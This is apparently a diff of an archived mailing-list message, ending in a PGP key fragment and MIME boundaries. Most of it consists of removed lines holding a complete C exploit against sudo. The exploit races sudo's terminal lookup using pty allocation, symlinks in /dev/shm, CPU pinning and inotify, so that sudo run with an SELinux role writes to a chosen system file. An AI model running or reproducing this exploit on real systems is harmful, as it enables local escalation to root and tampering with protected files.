+RHVuNzFRbWFPeHljOEdSOXl0VWd4MXBzcFdmbG83TgpvUHBzcC9kL2dsWmox
+U0dVVnpydWRpYmNrV1Ivb29LZk1Gck1uTStwQmFFMjByMWhPRUdjVWx5QzBI
+QWNGZ24yCnNydlFXdW5mNmttUHZaWmUyVWwxUXkxRDZZNE1YSEljbDVESDhy
+RnY4YUxsZlhjPQo9dXo2TwotLS0tLUVORCBQR1AgUFVCTElDIEtFWSBCTE9D
+Sy0tLS0t
 
-#define SUDO_BINARY "/usr/bin/sudo"
-#define TARGET_FILE "/etc/init.d/README"
-#define SELINUX_ROLE "unconfined_r"
+--b1_abeb954dd8329bd5dd9c5459767f2163--
 
-#define WORKING_DIR "/dev/shm/_tmp"
-#define TTY_SYMLINK WORKING_DIR "/_tty"
-#define TTY_SYMLINK_ TTY_SYMLINK "_"
-
-#define die() do { \
-    fprintf(stderr, "died in %s: %u\n", __func__, __LINE__); \
-    exit(EXIT_FAILURE); \
-} while (0)
-
-int
-main(const int my_argc, const char * const my_argv[])
-{
-    if (my_argc <= 1) die();
-    if (my_argc >= INT_MAX/2) die();
-    char comm[sizeof(WORKING_DIR) + 16];
-    char pts[PATH_MAX];
-
-    #define PTS_NUM 32
-    int pts_fds[2 * PTS_NUM];
-    unsigned int i = PTS_NUM;
-    while (i--) {
-        int ptm_fd;
-        if (openpty(&ptm_fd, &pts_fds[i], pts, NULL, NULL)) die();
-        if (close(ptm_fd)) die();
-    }
-    struct stat sbuf;
-    if (fstat(*pts_fds, &sbuf)) die();
-    if (!S_ISCHR(sbuf.st_mode)) die();
-    if (sbuf.st_rdev <= 0) die();
-    if ((unsigned int)snprintf(comm, sizeof(comm), "%s/     %lu ", WORKING_DIR, (unsigned long)sbuf.st_rdev)
-                                  >= sizeof(comm)) die();
-    for (i = 0; i < PTS_NUM; i++) {
-        if (close(pts_fds[i])) die();
-    }
-
-    if (mkdir(WORKING_DIR, 0700)) die();
-    if (symlink(pts, TTY_SYMLINK)) die();
-    if (symlink(TARGET_FILE, TTY_SYMLINK_)) die();
-    if (symlink(SUDO_BINARY, comm)) die();
-
-    const int inotify_fd = inotify_init1(IN_CLOEXEC);
-    if (inotify_fd <= -1) die();
-    const int working_wd = inotify_add_watch(inotify_fd, WORKING_DIR, IN_OPEN | IN_CLOSE_NOWRITE);
-    if (working_wd <= -1) die();
-
-    const int cpu = sched_getcpu();
-    if (cpu >= CPU_SETSIZE) die();
-    if (cpu < 0) die();
-    cpu_set_t cpu_set;
-    CPU_ZERO(&cpu_set);
-    CPU_SET(cpu, &cpu_set);
-    if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0) die();
-
-    const pid_t pid = fork();
-    if (pid <= -1) die();
-    if (pid == 0) {
-        const unsigned int argc = 3 + my_argc - 1;
-        char ** const argv = calloc(argc + 1, sizeof(char *));
-        if (!argv) die();
-        argv[0] = comm;
-        argv[1] = "-r";
-        argv[2] = SELINUX_ROLE;
-        memcpy(&argv[3], &my_argv[1], my_argc * sizeof(char *));
-        if (argv[argc]) die();
-
-        if (setpriority(PRIO_PROCESS, 0, +19) != 0) die();
-        static const struct sched_param sched_param = { .sched_priority = 0 };
-        (void) sched_setscheduler(0, SCHED_IDLE, &sched_param);
-        execve(*argv, argv, NULL);
-        die();
-    }
-
-    struct inotify_event event;
-    if (read(inotify_fd, &event, sizeof(event)) != (ssize_t)sizeof(event)) die();
-    if (kill(pid, SIGSTOP)) die();
-    if (event.wd != working_wd) die();
-    if (event.mask != (IN_OPEN | IN_ISDIR)) die();
-
-    for (i = 0; ; i++) {
-        if (i >= sizeof(pts_fds) / sizeof(*pts_fds)) die();
-        int ptm_fd;
-        char tmp[PATH_MAX];
-        if (openpty(&ptm_fd, &pts_fds[i], tmp, NULL, NULL)) die();
-        if (!strcmp(tmp, pts)) break;
-        if (close(ptm_fd)) die();
-    }
-    while (i--) {
-        if (close(pts_fds[i])) die();
-    }
-    if (kill(pid, SIGCONT)) die();
-    if (read(inotify_fd, &event, sizeof(event)) != (ssize_t)sizeof(event)) die();
-    if (kill(pid, SIGSTOP)) die();
-    if (event.wd != working_wd) die();
-    if (event.mask != (IN_CLOSE_NOWRITE | IN_ISDIR)) die();
-
-    if (rename(TTY_SYMLINK_, TTY_SYMLINK)) die();
-    if (kill(pid, SIGCONT)) die();
-
-    int status = 0;
-    if (waitpid(pid, &status, WUNTRACED) != pid) die();
-    if (!WIFEXITED(status)) die();
-
-    if (unlink(comm)) die();
-    if (unlink(TTY_SYMLINK)) die();
-    if (rmdir(WORKING_DIR)) die();
-    exit(WEXITSTATUS(status));
-}
-
---bFsKbPszpzYNtEU6--
